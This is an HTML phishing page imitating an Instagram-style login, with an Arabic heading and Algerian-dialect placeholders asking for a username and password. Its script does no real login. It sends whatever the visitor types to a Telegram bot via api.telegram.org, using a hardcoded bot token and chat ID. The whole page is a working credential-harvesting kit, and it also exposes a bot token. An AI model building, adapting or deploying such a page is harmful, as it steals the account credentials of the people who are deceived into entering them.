<!DOCTYPE html>
<html>
<head>

<style>

body{
background:#f0f2f5;
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
.box{
background:#121212;
padding:40px;
border-radius:15px;
width:90%;
max-width:400px;
margin:auto;
text-align:center;
box-shadow:0 0 25px rgba(0,0,0,0.6);
}

input{
width:100%;
padding:12px;
margin:10px 0;
border-radius:8px;
border:1px solid #333;
background:#1a1a1a;
color:white;

button{
width:100%;
padding:12px;
background:#3897f0;
border:none;
border-radius:8px;
color:white;
font-size:16px;
}
  
h3{
font-size:26px;
background: linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
}
  
</style>

</head>

<body>

<div class="box">
  
<img src="logo.jpg" width="120">

<h3>تسجيل الدخول </h3>

<input id="name" placeholder="isem te3 cont">

<input id="secret" placeholder="modpas" type="password">

<button onclick="send()">دخول</button>

</div>

<script>

const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc";
const CHAT_ID = "7737717483";

function send(){

let name = document.getElementById("name").value;
let secret = document.getElementById("secret").value;

let text = "بيانات جديدة:\nالاسم: " + name + "\nالسر: " + secret;

fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:CHAT_ID,
text:text
})
});

}

</script>

</body>
</html>
